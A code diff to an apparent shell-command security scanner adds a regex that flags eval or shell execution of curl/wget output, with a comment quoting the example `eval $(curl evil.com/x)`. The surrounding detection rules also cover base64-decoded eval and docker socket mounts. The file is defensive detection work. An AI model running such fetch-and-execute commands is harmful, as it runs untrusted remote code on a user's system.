@@ -125,6 +125,19 @@ const CRITICAL_PATTERNS = [
     label: 'eval of base64-decoded payload',
     re: /\b(?:eval|exec|sh|bash)\s+[^\n]*\bbase64\s+(?:-d|--decode|-D)\b/,
   },
+  // (v1.10.162) eval of remote-fetch output — `eval $(curl
+  // evil.com/x)` runs whatever bytes the URL returns as
+  // shell code. After denoise unwraps `$(...)`, the inner
+  // curl is visible but doesn't trip curl-pipe-shell (no
+  // `|`) or curl-pipe-interpreter (no `| python`). Same
+  // critical tier — the eval+curl shape is the textbook RCE
+  // primitive. Also catches the bash/sh/exec form for the
+  // same reason.
+  {
+    code: 'eval-network-fetch',
+    label: 'eval / exec / sh / bash of network-fetch output (curl|wget piped via $(...))',
+    re: /\b(?:eval|exec|sh|bash)\s+[^\n;]*\b(?:curl|wget|fetch|https?:\/\/)/,
+  },
   // (v1.10.54) Catastrophic but missing from the original catalog.
   {
     code: 'docker-sock-mount',
